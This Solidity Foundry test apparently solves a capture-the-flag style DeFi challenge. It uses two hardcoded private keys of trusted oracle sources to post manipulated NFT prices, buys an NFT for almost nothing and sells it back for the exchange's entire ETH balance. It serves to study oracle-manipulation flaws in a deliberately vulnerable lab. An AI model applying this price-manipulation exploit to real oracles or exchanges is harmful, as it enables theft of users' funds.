// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.2;

import {Test, console} from "forge-std/Test.sol";
import {Exchange} from "../src/Exchange.sol";
import {TrustfulOracle} from "../src/TrustfulOracle.sol";
import {DamnValuableNFT} from "../src/DamnValuableNFT.sol";
import {TrustfulOracleInitializer} from "../src/TrustfulOracleInitializer.sol";


contract CanAttackOracle is Test {
    Exchange exchange;
    TrustfulOracleInitializer trustfulOracleInitializer;
    TrustfulOracle _oracle;
    DamnValuableNFT nft;

    address player = makeAddr("player");

    uint256 PRIVATE_KEY1 = 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9;
    uint256 PRIVATE_KEY2 = 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48;

    address key1 = vm.addr(PRIVATE_KEY1);
    address key2 = vm.addr(PRIVATE_KEY2);


    uint256 EXCHANGE_INITIAL_ETH_BALANCE = 9990 ether;
    uint256 INITIAL_NFT_PRICE = 999 ether;
    uint256 INITIAL_PLAYER_BALANCE = 100000000000000000;
    uint256 TRUSTED_SOURCE_BALANCE = 2 ether;

    address[] sources = [ 0xA73209FB1a42495120166736362A1DfA9F95A105 ,
     0xe92401A4d3af5E446d93D11EEc806b1462b39D15 , 
     0x81A5D6E50C214044bE44cA0CB057fe119097850c
    ];
    string[] symbols = ['DVNFT', 'DVNFT', 'DVNFT'];
    uint256[] initialPrice = [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE];


    function setUp() external {
        //SET SOURCES BALANCES
        for(uint256 i = 0; i < sources.length; i++){
             vm.deal(sources[i], TRUSTED_SOURCE_BALANCE );
             assertEq(sources[i].balance, TRUSTED_SOURCE_BALANCE);
        }

        //SET PLAYERS BALANCE
        vm.deal(player, INITIAL_PLAYER_BALANCE);
        assertEq(player.balance, INITIAL_PLAYER_BALANCE);

        trustfulOracleInitializer = new TrustfulOracleInitializer(sources, symbols, initialPrice);
        _oracle = trustfulOracleInitializer.oracle();
        //Asserting the initialprices from their source
        for(uint256 i = 0; i < sources.length; i++){
            assertEq(_oracle.getPriceBySource(symbols[i], sources[i]), INITIAL_NFT_PRICE);
        }

        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(_oracle));
        nft = exchange.token();
        // Check that it is renounced
        assertEq(nft.owner(), address(0));
        //check the minter role
        assertEq(nft.MINTER_ROLE(), nft.rolesOf(address(exchange)));

 }

    function test_canDrainExchain() public {
        vm.startPrank(player);
        //Expect a revert first when value is less than price
        vm.expectRevert();
        exchange.buyOne{value: 2 ether}();
        vm.stopPrank();

        //Manupulating the price with the key
        vm.prank(key1);
        _oracle.postPrice(symbols[0], 0);
        vm.prank(key2);
        _oracle.postPrice(symbols[1], 1);

        //purchase an Nft with the manipulated price
        uint256 latestPrice = _oracle.getMedianPrice(symbols[0]);
        vm.prank(player);
        exchange.buyOne{value: latestPrice}();

        //asserting the nft balance of the player
        assertEq(nft.balanceOf(player), 1);

        //Manupulating the price with the key to make it possible to sell at a very high price(exchange balance); hence draining the exchange
        uint256 exchangeBalance = (address(exchange).balance);
        vm.prank(key1);
        _oracle.postPrice(symbols[0], exchangeBalance);
        vm.prank(key2);
        _oracle.postPrice(symbols[1], exchangeBalance);

        //sell the Nft with the manipulated price
        vm.startPrank(player);
        console.log(player.balance);
        nft.approve(address(exchange), 0);
        exchange.sellOne(0);
        vm.stopPrank();

        console.log(player.balance); // To show that the players balance has increased by the exchange balance
        
 }
}


